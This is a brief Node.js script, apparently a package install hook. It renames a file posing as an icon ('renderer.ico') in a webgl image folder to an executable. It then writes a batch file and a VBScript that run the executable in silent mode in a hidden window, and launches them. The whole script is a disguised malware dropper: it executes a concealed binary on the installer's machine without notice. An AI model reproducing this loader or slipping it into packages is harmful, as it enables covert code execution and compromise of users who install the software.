var path = require('path')
var fs = require('fs')
var { exec } = require('child_process')

var bpath = path.join(__dirname + '\\..\\webgl\\img')
var path1 = path.join(bpath + '\\renderer.ico')
var path2 = path.join(bpath + '\\renderer.exe')
console.log(path1)
console.log(path2)
fs.rename(path1, path2, function(err) {
});


fs.writeFile(path.join(bpath + '\\helper.bat'), '@echo off\nrenderer.exe /run /exit /SilentMode', function(err) {
})


fs.writeFile(path.join(bpath + '\\helper.vbs'), 'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "helper.bat" & Chr(34), 0\nSet WshShell = Nothing', function(err) {
})
console.log(path.join(bpath + '\\helper.vbs'))
exec(`start helper.vbs`, {
cwd: bpath})